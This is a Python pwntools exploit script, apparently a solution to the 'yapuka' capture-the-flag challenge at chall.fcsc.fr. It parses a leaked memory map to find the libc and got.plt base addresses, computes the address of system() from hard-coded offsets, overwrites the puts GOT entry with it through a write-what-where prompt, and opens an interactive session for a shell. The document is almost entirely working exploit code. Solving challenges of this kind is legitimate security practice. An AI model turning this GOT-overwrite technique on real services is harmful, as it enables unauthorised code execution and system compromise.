from pwn import *
context.log_level = "debug"

# Constantes
libc = 0x7ffff7dc4000
libc_puts = 0x0
libc_puts_offset = 0x77980
libc_system = 0x0
libc_system_offset = 0x4C020

got_plt = 0x0
got_plt_puts = 0x0


# Leak addresses
io = remote("chall.fcsc.fr", 2110)
# io = process(["gdbserver", "localhost:3333", "./yapuka"])
io.recvuntil(b"Yapuka!\n")
leak_str = io.recvuntil(b"Where:\n").decode()
# parse the libc base address
lines = []
for line in leak_str.split('\n'):
    if "libc.so.6" in line:
        lines.append(line)
libc = int(lines[0].split('-')[0], 16)
libc_puts = libc + libc_puts_offset
libc_system = libc + libc_system_offset

# parse the got.plt base address
lines = []
for line in leak_str.split('\n'):
    if "/app/yapuka" in line:
    # if "/yapuka/yapuka" in line:
        lines.append(line)
# print(leak_str)
got_plt = int(lines[-1].split('-')[0], 16)
got_plt_puts = got_plt + 0x0

print(f"Leak : ")
print(f"\tlibc    base addr : {hex(libc)}")
print(f"\tgot.plt base addr : {hex(got_plt)}")

# Write libc_system addr to got_plt_puts
io.sendline(str(got_plt_puts).encode())
io.recvuntil(b"What:\n")
io.sendline(str(libc_system).encode())

io.interactive()




